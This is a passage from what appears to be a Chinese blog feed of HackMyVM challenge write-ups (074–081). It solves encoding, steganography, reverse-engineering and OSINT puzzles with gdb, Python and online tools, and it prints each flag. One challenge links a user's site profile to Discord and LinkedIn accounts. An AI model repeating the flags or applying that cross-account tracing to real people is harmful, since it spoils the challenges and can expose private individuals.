000000f0  0a 20 20 20 20 20 20 09  09 20 20 20 20 0a 09 0a  |.      ..    ...|
00000100  20 20 20 20 20 09 20 09  20 09 20 20 0a 09 0a 20  |     . . .  ... |
00000110  20 20 20 20 09 20 09 20  09 20 20 0a 09 0a 20 20  |    . . .  ...  |
00000120  20 20 20 20 09 09 20 09  20 20 0a 09 0a 20 20 20  |    .. .  ...   |
00000130  20 20 09 20 09 09 09 09  09 0a 09 0a 20 20 20 20  |  . ........    |
00000140  20 09 20 09 20 09 20 20  0a 09 0a 20 20 20 20 20  | . . .  ...     |
00000150  20 09 09 20 09 20 20 0a  09 0a 20 20 20 20 20 09  | .. .  ...     .|
00000160  20 20 09 20 09 09 0a 09  0a 20 20 20 20 20 20 09  |  . .....      .|
00000170  09 20 20 09 09 0a 09 0a  20 20 20 20 20 09 20 09  |.  .....     . .|
00000180  09 09 09 09 0a 09 0a 20  20 20 20 20 09 20 20 20  |.......     .   |
00000190  20 09 09 0a 09 0a 20 20  20 20 20 20 09 09 20 09  | .....      .. .|
000001a0  20 20 0a 09 0a 20 20 20  20 20 09 20 09 20 20 09  |  ...     . .  .|
000001b0  20 0a 09 0a 20 20 20 20  20 20 09 09 20 20 09 09  | ...      ..  ..|
000001c0  0a 09 0a 20 20 20 20 20  09 20 09 09 09 09 09 0a  |...     . ......|
000001d0  09 0a 20 20 20 20 20 20  09 09 20 20 20 20 0a 09  |..      ..    ..|
000001e0  0a 20 20 20 20 20 09 20  20 20 09 09 20 0a 09 0a  |.     .   .. ...|
000001f0  20 20 20 20 20 09 20 09  09 09 09 09 0a 09 0a 20  |     . ........ |
00000200  20 20 20 20 09 20 09 20  20 09 09 0a 09 0a 20 20  |    . .  .....  |
00000210  20 20 20 20 09 09 20 20  20 20 0a 09 0a 20 20 20  |    ..    ...   |
00000220  20 20 09 20 20 09 09 20  09 0a 09 0a 20 20 20 20  |  .  .. ....    |
00000230  20 09 20 20 20 09 20 09  0a 09 0a 20 20 20 20 20  | .   . ....     |
00000240  09 20 09 09 09 09 09 0a  09 0a 20 20 20 20 20 09  |. ........     .|
00000250  20 20 20 20 09 20 0a 09  0a 20 20 20 20 20 09 20  |    . ...     . |
00000260  09 20 09 20 09 0a 09 0a  20 20 20 20 20 20 09 09  |. . ....      ..|
00000270  20 09 20 09 0a 09 0a 20  20 20 20 20 20 09 09 20  | . ....      .. |
00000280  20 20 09 0a 09 0a 20 20  20 20 20 09 20 20 09 09  |  ....     .  ..|
00000290  09 20 0a 09 0a 20 20 20  20 20 20 09 09 20 20 09  |. ...      ..  .|
000002a0  09 0a 09 0a 20 20 20 20  20 20 09 09 20 09 20 09  |....      .. . .|
000002b0  0a 09 0a 20 20 20 20 20  20 09 09 20 09 20 09 0a  |...      .. . ..|
000002c0  09 0a 20 20 20 20 20 09  20 09 09 09 09 09 0a 09  |..     . .......|
000002d0  0a 20 20 20 20 20 09 20  20 20 20 20 09 0a 09 0a  |.     .     ....|
000002e0  20 20 20 20 20 09 20 09  20 20 09 20 0a 09 0a 20  |     . .  . ... |
000002f0  20 20 20 20 20 09 09 20  20 20 20 0a 09 0a 20 20  |     ..    ...  |
00000300  20 20 20 09 20 09 20 09  20 09 0a 09 0a 20 20 20  |   . . . ....   |
00000310  20 20 09 20 20 09 09 09  20 0a 09 0a 20 20 20 20  |  .  ... ...    |
00000320  20 09 20 20 20 09 20 20  0a 09 0a 20 20 20 20 20  | .   .  ...     |
00000330  09 20 09 09 09 09 09 0a  09 0a 20 20 20 20 20 09  |. ........     .|
00000340  20 20 09 20 20 20 0a 09  0a 20 20 20 20 20 20 09  |  .   ...      .|
00000350  09 20 20 09 09 0a 09 0a  20 20 20 20 20 09 20 09  |.  .....     . .|
00000360  20 20 09 20 0a 09 0a 20  20 20 20 20 20 09 09 20  |  . ...      .. |
00000370  20 09 09 0a 09 0a 20 20  20 20 20 20 09 09 09 20  | .....      ... |
00000380  09 20 0a 09 0a 20 20 20  20 20 20 09 20 09 20 20  |. ...      . .  |
00000390  09 0a 09 0a 20 20                                 |....  |
00000396
```

看着有点规律
```bash
┌──(pythonvenv)─(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat message.txt | tr ' \t' '01'  
01000100
00110000
01001110
01010100
01011111
01010111
00110000
01010010
01010010
01011001
01011111
01000111
01010101
01011001
00110101
01011111



1000
00011
001101
1000
00001
1010
101
001101
000
11111
11111
10
101011
001101



0001000111
1
000000110000
1
000001010100
1
000001010100
1
000000110100
1
000001011111
1
000001010100
1
000000110100
1
000001001011
1
000000110011
1
000001011111
1
000001000011
1
000000110100
1
000001010010
1
000000110011
1
000001011111
1
000000110000
1
000001000110
1
000001011111
1
000001010011
1
000000110000
1
000001001101
1
000001000101
1
000001011111
1
000001000010
1
000001010101
1
000000110101
1
000000110001
1
000001001110
1
000000110011
1
000000110101
1
000000110101
1
000001011111
1
000001000001
1
000001010010
1
000000110000
1
000001010101
1
000001001110
1
000001000100
1
000001011111
1
000001001000
1
000000110011
1
000001010010
1
000000110011
1
000000111010
1
000000101001
1
00
```

https://gchq.github.io/CyberChef/

![image-20250729214536810](http://7r1UMPHK.github.io/image/20250729214537116.webp)

第一段

```bash
D0NT_W0RRY_GUY5_
```

然后中间这段纯脑洞，是莫斯密码

```bash
┌──(pythonvenv)─(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat mosi|sed 's/1/-/g; s/0/./g'                                                                                                       
-...
...--
..--.-
-...
....-
-.-.
-.-
..--.-
...
-----
-----
-.
-.-.--
..--.-
```

https://morsecodetranslator.com/

```bash
B3_B4CK_S00N!_
```

后面的扒拉了半天，结果发现是转换的问题

```bash
┌──(pythonvenv)─(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ tail -n +35 message.txt | tr '$ \t' '001' | grep -v '^1$\|^$' | sed 's/^0000//' | sed 's/.*\(.\{8\}\)$/\1/'
01000111
00110000
01010100
01010100
00110100
01011111
01010100
00110100
01001011
00110011
01011111
01000011
00110100
01010010
00110011
01011111
00110000
01000110
01011111
01010011
00110000
01001101
01000101
01011111
01000010
01010101
00110101
00110001
01001110
00110011
00110101
00110101
01011111
01000001
01010010
00110000
01010101
01001110
01000100
01011111
01001000
00110011
01010010
00110011
00111010
00101001
00
```

![image-20250729222525237](http://7r1UMPHK.github.io/image/20250729222525532.webp)

```bash
G0TT4_T4K3_C4R3_0F_S0ME_BU51N355_AR0UND_H3R3:)
```

拼接

```bash
D0NT_W0RRY_GUY5_B3_B4CK_S00N!_G0TT4_T4K3_C4R3_0F_S0ME_BU51N355_AR0UND_H3R3:)
```

不用加HMV直接提交sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20081.html</guid><pubDate>Wed, 06 Aug 2025 00:38:41 +0000</pubDate></item><item><title>Challenge 080</title><link>https://7r1UMPHK.github.io/post/Challenge%20080.html</link><description>这两天配IE的X园区配的想鼠，github还没恢复，打个challenge冷静一下

![image-20250729212441389](http://7r1UMPHK.github.io/image/20250729212450348.webp)

```
(?![a-z])([VHM]{3})(?!\w)(?P&lt;Q&gt;[\{])R(?![\d])(e)g\3x(\_{1})4\4th\3\4(W)in(?P&lt;H&gt;\x7d)$
```

看着像正则

```
HMV{Regex_4_the_Win}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20080.html</guid><pubDate>Wed, 06 Aug 2025 00:37:57 +0000</pubDate></item><item><title>Challenge 079</title><link>https://7r1UMPHK.github.io/post/Challenge%20079.html</link><description>![image-20250728104622420](http://7r1UMPHK.github.io/image/20250728104641252.webp)

![image-20250728104649253](http://7r1UMPHK.github.io/image/20250728104649363.webp)

反编译

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  funkcja1(argc, argv, envp);
  return 0;
}

int funkcja1()
{
  char s[32]; // [rsp+0h] [rbp-40h] BYREF
  __int64 v2[2]; // [rsp+20h] [rbp-20h] BYREF
  int v3; // [rsp+30h] [rbp-10h]

  v2[0] = 0xC5E4E0C3F9E0D0D4LL;
  v2[1] = 0xE09AD8F7E4C0E1D3LL;
  v3 = -1802251312;
  policz_to(s, v2, string72);
  return puts(s);
}

__int64 __fastcall policz_to(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  int i; // [rsp+24h] [rbp-4h]

  for ( i = 0; i &lt;= 19; ++i )
    *(_BYTE *)(i + a1) = ~(*(_BYTE *)(i + a3) ^ *(_BYTE *)(i + a2));
  result = a1 + 20;
  *(_BYTE *)(a1 + 20) = 0;
  return result;
}

.data:0000000000407910 string72        db 'dIZQmPVTUttkFJ0SlZ81',0
.data:0000000000407910                                         ; DATA XREF: funkcja1+37↑o
```

他这个程序直接执行是会输出东西的

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ./hmv-011       
OfEWQOMnyjKpNmULCvTZ
```

但问题是这个不是flag，而且我根据他的tip，尝试rev也不行

然后我去仔细观察了一下ida，我发现他还有很多funkcja的函数，1-100

```c
int funkcja2()
{
  char s[32]; // [rsp+0h] [rbp-40h] BYREF
  __int64 v2[2]; // [rsp+20h] [rbp-20h] BYREF
  int v3; // [rsp+30h] [rbp-10h]

  v2[0] = 0xD9CD87CFF6E48DECLL;
  v2[1] = 0xEFC3BFD3FFEE83FELL;
  v3 = -1044847680;
  policz_to(s, v2, string9);
  return puts(s);
}
```

那直接写个脚本爆破

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ objdump -d ./hmv-011 | grep -A 10 '&lt;main&gt;:'
0000000000403336 &lt;main&gt;:
  403336:       f3 0f 1e fa             endbr64
  40333a:       55                      push   %rbp
  40333b:       48 89 e5                mov    %rsp,%rbp
  40333e:       b8 00 00 00 00          mov    $0x0,%eax
  403343:       e8 56 de ff ff          call   40119e &lt;funkcja1&gt;
  403348:       b8 00 00 00 00          mov    $0x0,%eax
  40334d:       5d                      pop    %rbp
  40334e:       c3                      ret

Disassembly of section .fini:
```

编写脚本

```bash
#!/bin/bash

BIN='./hmv-011'
ADDR='*0x403343'

for i in $(seq 1 100); do
    FN='funkcja${i}'
    echo -n '[*] test: ${FN}'

    OUT=$(gdb -q -batch \
        -ex 'b ${ADDR}' \
        -ex 'r' \
        -ex 'jump ${FN}' \
        -ex 'c' \
        --args ${BIN} 2&gt;/dev/null)

    if echo '$OUT' | grep -q 'HMV{'; then
        echo -e '\n\n[+] Found: ${FN}'
        echo '[!] FLAG: $(echo '$OUT' | grep -o 'HMV{[^}]*}')'
        exit 0
    else
        echo -ne '\r'
    fi
done

echo '[-] Failed.'
```

执行

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ bash a.sh
[*] test: funkcja82

[+] Found: funkcja82
[!] FLAG: HMV{Is11task_hard??}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20079.html</guid><pubDate>Wed, 06 Aug 2025 00:37:40 +0000</pubDate></item><item><title>Challenge 078</title><link>https://7r1UMPHK.github.io/post/Challenge%20078.html</link><description>这题我说怎么这么眼熟，这不我进群解的第一题吗
![image-20250727223622608](http://7r1UMPHK.github.io/image/20250727223622837.webp)

是有一个用户叫Alter

https://hackmyvm.eu/profile/?user=Alter

![img](https://hackmyvm.eu/img/u/Alter.jpg)

他头像有问题，是discord的一个用户

https://discord.id/

![](http://7r1UMPHK.github.io/image/20250806083618411.webp)

去hmv的discord扒拉一下他
![image-20250727224618346](http://7r1UMPHK.github.io/image/20250727224618491.webp)

然后这个哥们在linkedin，有个号

https://www.linkedin.com/in/alter-ego-003280321/

```
HMV{4lt3r_3g0s_d0nt_h1d3}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20078.html</guid><pubDate>Wed, 06 Aug 2025 00:36:42 +0000</pubDate></item><item><title>Challenge 077</title><link>https://7r1UMPHK.github.io/post/Challenge%20077.html</link><description>![image-20250727172730845](http://7r1UMPHK.github.io/image/20250727172731096.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 077.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 4255250 bytes (4156 KiB)

Extracting archive: 077.zip
--
Path = 077.zip
Type = zip
Physical Size = 4255250

Everything is Ok

Size:       4283925
Compressed: 4255250
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al
总计 8360
drwxr-xr-x 1 kali kali    4096  7月27日 05:28 .
drwxr-xr-x 1 kali kali   16384  7月26日 10:07 ..
-rwxr-xr-x 1 kali kali 4255250  7月27日 05:27 077.zip
-rwxr-xr-x 1 kali kali 4283925 2024年 7月 5日 Building.jpg

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ exiftool Building.jpg 
ExifTool Version Number         : 13.25
File Name                       : Building.jpg
Directory                       : .
File Size                       : 4.3 MB
File Modification Date/Time     : 2024:07:05 15:37:28-04:00
File Access Date/Time           : 2025:07:27 05:28:10-04:00
File Inode Change Date/Time     : 2024:07:05 15:37:28-04:00
File Permissions                : -rwxr-xr-x
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Orientation                     : Horizontal (normal)
Y Resolution                    : 72
X Resolution                    : 72
Software                        : MediaTek Camera Application
Image Description               : 
Y Cb Cr Positioning             : Co-sited
Exif Version                    : 0220
Exposure Compensation           : 0
Exposure Program                : Not Defined
Color Space                     : sRGB
Max Aperture Value              : 1.0
Exif Image Height               : 4096
Brightness Value                : 9.6
Flashpix Version                : 0100
Interoperability Index          : R98 - DCF basic file (sRGB)
Recommended Exposure Index      : 0
Exposure Mode                   : Auto
Exif Image Width                : 3072
Components Configuration        : Y, Cb, Cr, -
Digital Zoom Ratio              : 1
Metering Mode                   : Center-weighted average
Sensitivity Type                : Unknown
Scene Capture Type              : Standard
Light Source                    : Other
Resolution Unit                 : inches
Compression                     : JPEG (old-style)
Thumbnail Offset                : 616
Thumbnail Length                : 27648
Image Width                     : 3072
Image Height                    : 4096
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 3072x4096
Megapixels                      : 12.6
Thumbnail Image                 : (Binary data 27648 bytes, use -b option to extract)
```

​	EXIF数据没有包含街道名称的字段

![Building](http://7r1UMPHK.github.io/image/20250727173525425.webp)

google一下

https://jp.123rf.com/photo_24186080_%E3%83%95%E3%83%A9%E3%83%B3%E3%82%B9-%E3%83%91%E3%83%AA%E3%81%AE%E5%85%B8%E5%9E%8B%E7%9A%84%E3%81%AA%E3%82%A2%E3%83%91%E3%83%BC%E3%83%88%E3%81%AE%E5%BB%BA%E7%89%A9.html

https://www.flickr.com/photos/62139793@N03/5653696549/in/photostream/

蒙马特 圣心大教堂

扒拉了很久，找不到，去discord发现绿老哥解过了

https://www.google.pl/maps/@48.887831,2.341695,3a,20.4y,17.44h,85.63t/data=!3m7!1e1!3m5!1sf_2fd7iAG1y1DnDGNPVqkQ!2e0!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fcb_client%3Dmaps_sv.tactile%26w%3D900%26h%3D600%26pitch%3D4.371506987724828%26panoid%3Df_2fd7iAG1y1DnDGNPVqkQ%26yaw%3D17.439427502100934!7i16384!8i8192?coh=205410&amp;entry=ttu

抄一下

````
HMV{Rue_Saint-Vincent}
````

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20077.html</guid><pubDate>Wed, 06 Aug 2025 00:34:42 +0000</pubDate></item><item><title>Challenge 076</title><link>https://7r1UMPHK.github.io/post/Challenge%20076.html</link><description>![image-20250727171057275](http://7r1UMPHK.github.io/image/20250727171101631.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cd tmp      
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 076.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 415777 bytes (407 KiB)

Extracting archive: 076.zip
--
Path = 076.zip
Type = zip
Physical Size = 415777

Everything is Ok

Files: 2
Size:       1056496
Compressed: 415777
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al               
总计 1459
drwxr-xr-x 1 kali kali    4096  7月27日 05:11 .
drwxr-xr-x 1 kali kali   16384  7月26日 10:07 ..
-rwxr-xr-x 1 kali kali  415777  7月27日 05:11 076.zip
-rwxr-xr-x 1 kali kali   16392 2024年 7月 1日 hmv010
-rwxr-xr-x 1 kali kali 1040104 2024年 7月 1日 hmv010-static
```

运行

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ./hmv010-static
Enter the flag : hello
Sorry, 𝓣𝓻𝔂 𝓱𝓪𝓻𝓭𝓮𝓻 !
```

反编译

```bash
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  generate_random_numbers(argc, argv, envp);
  printf('Enter the flag : ');
  __isoc99_scanf('%32s', v4);
  if ( (unsigned int)xor_and_check(v4) )
    puts('馃憦 Bravo馃憦');
  else
    puts('Sorry, 饾摚饾摶饾攤 饾摫饾摢饾摶饾摥饾摦饾摶 !');
  return 0;
}

void generate_random_numbers()
{
  int i; // [rsp+Ch] [rbp-4h]

  srand(0);
  for ( i = 0; i &lt;= 31; ++i )
    numbers[i] = rand() % 256;
}

__int64 __fastcall xor_and_check(__int64 a1)
{
  int i; // [rsp+14h] [rbp-4h]

  for ( i = 0; i &lt;= 31; ++i )
  {
    if ( (FLAG[i] ^ numbers[i]) != *(unsigned __int8 *)(i + a1) )
      return 0LL;
  }
  return 1LL;
}
```

gdb

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ gdb ./hmv010-static 
GNU gdb (Debian 16.3-1) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type 'show copying' and 'show warranty' for details.
This GDB was configured as 'x86_64-linux-gnu'.
Type 'show configuration' for configuration details.
For bug reporting instructions, please see:
&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.

For help, type 'help'.
Type 'apropos word' to search for commands related to 'word'...
Reading symbols from ./hmv010-static...
(No debugging symbols found in ./hmv010-static)
(gdb) break xor_and_check
Breakpoint 1 at 0x401bdb
(gdb) run
Starting program: /mnt/hgfs/gx/x/tmp/hmv010-static 
Enter the flag : aaaaaa

Breakpoint 1, 0x0000000000401bdb in xor_and_check ()
(gdb) info variables FLAG
All variables matching regular expression 'FLAG':

Non-debugging symbols:
0x00000000004b7020  FLAG
(gdb) info variables numbers
All variables matching regular expression 'numbers':

Non-debugging symbols:
0x00000000004e83c0  numbers
(gdb) x/32bx 0x4b7020
0x4b7020 &lt;FLAG&gt;:        0x2f    0x00    0x00    0x00    0x8b    0x00    0x00    0x00
0x4b7028 &lt;FLAG+8&gt;:      0x3f    0x00    0x00    0x00    0x08    0x00    0x00    0x00
0x4b7030 &lt;FLAG+16&gt;:     0x01    0x00    0x00    0x00    0x8c    0x00    0x00    0x00
0x4b7038 &lt;FLAG+24&gt;:     0x2f    0x00    0x00    0x00    0x99    0x00    0x00    0x00
(gdb) x/32dw 0x4e83c0
0x4e83c0 &lt;numbers&gt;:     103     198     105     115
0x4e83d0 &lt;numbers+16&gt;:  81      255     74      236
0x4e83e0 &lt;numbers+32&gt;:  41      205     186     171
0x4e83f0 &lt;numbers+48&gt;:  242     251     227     70
0x4e8400 &lt;numbers+64&gt;:  124     194     84      248
0x4e8410 &lt;numbers+80&gt;:  27      232     231     141
0x4e8420 &lt;numbers+96&gt;:  118     90      46      99
0x4e8430 &lt;numbers+112&gt;: 51      159     201     154
(gdb) x/32dw 0x4b7020
0x4b7020 &lt;FLAG&gt;:        47      139     63      8
0x4b7030 &lt;FLAG+16&gt;:     1       140     47      153
0x4b7040 &lt;FLAG+32&gt;:     77      162     229     249
0x4b7050 &lt;FLAG+48&gt;:     147     149     167     118
0x4b7060 &lt;FLAG+64&gt;:     17      157     26      141
0x4b7070 &lt;FLAG+80&gt;:     118     138     130     255
0x4b7080 &lt;FLAG+96&gt;:     5       5       103     13
0x4b7090 &lt;FLAG+112&gt;:    108     192     138     231
```

写flag计算

```bash
#a.py
import random

def calc_flag():
    random.seed(0)
    
    flag_ints = [47, 139, 63, 8, 1, 140, 47, 153, 77, 162, 229, 249, 147, 149, 167, 118, 17, 157, 26, 141, 118, 138, 130, 255, 5, 5, 103, 13, 108, 192, 138, 231]
    numbers = [103, 198, 105, 115, 81, 255, 74, 236, 41, 205, 186, 171, 242, 251, 227, 70, 124, 194, 84, 248, 27, 232, 231, 141, 118, 90, 46, 99, 51, 159, 201, 154]
    
    flag = ''.join(chr(flag_ints[i] ^ numbers[i]) for i in range(32))
    print(flag)

calc_flag()
```

运行

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 a.py             
HMV{Pseudo_RanD0m_Numbers_In__C}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20076.html</guid><pubDate>Wed, 06 Aug 2025 00:33:33 +0000</pubDate></item><item><title>Challenge 075</title><link>https://7r1UMPHK.github.io/post/Challenge%20075.html</link><description>![image-20250726094546654](http://7r1UMPHK.github.io/image/20250726094546906.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 075.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 1660377 bytes (1622 KiB)

Extracting archive: 075.zip
--
Path = 075.zip
Type = zip
Physical Size = 1660377

Everything is Ok

Size:       1678207
Compressed: 1660377
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al
总计 3281
drwxr-xr-x 1 kali kali    4096  7月25日 21:46 .
drwxr-xr-x 1 kali kali   16384  7月25日 08:07 ..
-rwxr-xr-x 1 kali kali 1660377  7月25日 21:45 075.zip
-rwxr-xr-x 1 kali kali 1678207 2024年 5月26日 75.jpg

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ exiftool 75.jpg                                        
ExifTool Version Number         : 13.25
File Name                       : 75.jpg
Directory                       : .
File Size                       : 1678 kB
File Modification Date/Time     : 2024:05:26 06:25:51-04:00
File Access Date/Time           : 2025:07:25 21:46:51-04:00
File Inode Change Date/Time     : 2024:05:26 06:25:51-04:00
File Permissions                : -rwxr-xr-x
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Image Width                     : 2645
Image Height                    : 1276
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 2645x1276
Megapixels                      : 3.4
```

![75](http://7r1UMPHK.github.io/image/20250726094651605.webp)

google反向框一下就出来了

扒拉一下
https://www.alamy.com/stock-photo-view-on-narrow-cobbled-street-among-traditional-parisian-buildings-50665105.html

这里的比较清晰
https://www.flickr.com/photos/17770552@N02/25410475164/

这里显示了店铺名但是不是很清晰

![image-20250726100801703](http://7r1UMPHK.github.io/image/20250726100802211.webp)

AI真nb，去google map一看就看到了

![image-20250726100844052](http://7r1UMPHK.github.io/image/20250726100844945.webp)

```
HMV{The_Tea_Caddy}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20075.html</guid><pubDate>Wed, 06 Aug 2025 00:32:57 +0000</pubDate></item><item><title>Challenge 074</title><link>https://7r1UMPHK.github.io/post/Challenge%20074.html</link><description>这两天github被标记了，所以现在写的wp，博客后面才慢慢发

这两天复习快疯了，打打challenges

![image-20250726092459966](http://7r1UMPHK.github.io/image/20250726092508923.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 074.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 10720923 bytes (11 MiB)

Extracting archive: 074.zip
--
Path = 074.zip
Type = zip
Physical Size = 10720923

Everything is Ok

Files: 2
Size:       10729161
Compressed: 10720923
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al
总计 20969
drwxr-xr-x 1 kali kali     4096  7月25日 21:26 .
drwxr-xr-x 1 kali kali    16384  7月25日 08:07 ..
-rwxr-xr-x 1 kali kali 10729024 2024年 5月26日 074.png
-rwxr-xr-x 1 kali kali      137 2024年 5月28日 074.txt
-rwxr-xr-x 1 kali kali 10720923  7月25日 21:25 074.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat 074.txt 
0000000001100100011011110101111101111001011011110111010101011111011011000110100101101011011001010101111101111000011011110111001000111111
```

是hex，解一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat 074.txt | perl -lpe '$_=pack'B*',$_'
do_you_like_xor?
```

XOR异或，意思就是还有东西

![074](http://7r1UMPHK.github.io/image/20250726093019615.webp)

喵喵，哈哈哈

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ binwalk -e 074.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
60            0x3C            Zlib compressed data, default compression

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented

                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ binwalk 074.png    

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 2882 x 3840, 8-bit/color RGB, non-interlaced
60            0x3C            Zlib compressed data, default compression
3858618       0x3AE0BA        JBOOT SCH2 kernel header, compression type: gzip, Entry Point: 0xFE3E8414, image size: 936827483 bytes, data CRC: 0xAC684B75, Data Address: 0xD1EDDC73, rootfs offset: 0xC8D8C018, rootfs size: 294417102 bytes, rootfs CRC: 0xA1288981, header CRC: 0x44230814, header size: 36867 bytes, cmd line length: 22886 bytes
4911357       0x4AF0FD        JBOOT STAG header, image id: 0, timestamp 0x883BEF22, image size: 271372934 bytes, image JBOOT checksum: 0xB20, header JBOOT checksum: 0x20EB

                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ zsteg 074.png      
imagedata           .. text: '\n\n\n\t\t\t\n\n'
b1,rgb,msb,xy       .. text: 'DJ$%I\'II$II'
b2,b,msb,xy         .. text: 'VZj]-vOF'
b2,rgb,lsb,xy       .. file: OpenPGP Secret Key
b3,b,msb,xy         .. text: 'Mqpn|Tq\rz'
b3,bgr,lsb,xy       .. text: 'Ho$[@2A 4'
b4,r,lsb,xy         .. text: 'St{aUFdb'
b4,b,lsb,xy         .. text: 'DDUDUTDDEUTDUUTDTDUDDDDDDDUUfUUDDEUUDUV'
b4,rgb,lsb,xy       .. text: 'UCCxtTwk'
b4,rgb,msb,xy       .. text: 'E4sEFVaS6'
b4,bgr,lsb,xy       .. text: 'ESCxtTgz'
b4,bgr,msb,xy       .. text: '0DuCFQVc3'
```

没啥感兴趣的，应该是lsb

https://georgeom.net/StegOnline/extract

Extract Data  RGB全0

hex那扒拉一段

```
68091924000000000108000000111b5342e6eeab5bb7855cd926dc2491c75648d2564
```

处理

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat 074.txt | perl -lpe '$_=pack'B*',$_' | xxd -p
00646f5f796f755f6c696b655f786f723f0a
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ echo -n '00646f5f796f755f6c696b655f786f723f0a' | wc -c        
36
                    
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ echo '68091924000000000108000000111b5342e6eeab5bb7855cd926dc2491c75648d2564' | head -c 36
68091924000000000108000000111b5342e6                                                    
```

XOR一下
```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 -c 'a='00646f5f796f755f6c696b655f786f723f0a';b='68091924000000000108000000111b5342e6';print(''.join(format(int(a[i:i+2],16)^int(b[i:i+2],16),'02x')for i in range(0,36,2)))'
686d767b796f755f6d616b655f6974217dec
                     
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ echo '686d767b796f755f6d616b655f6974217dec' | xxd -r -p
hmv{you_make_it!}�                                                                      
```

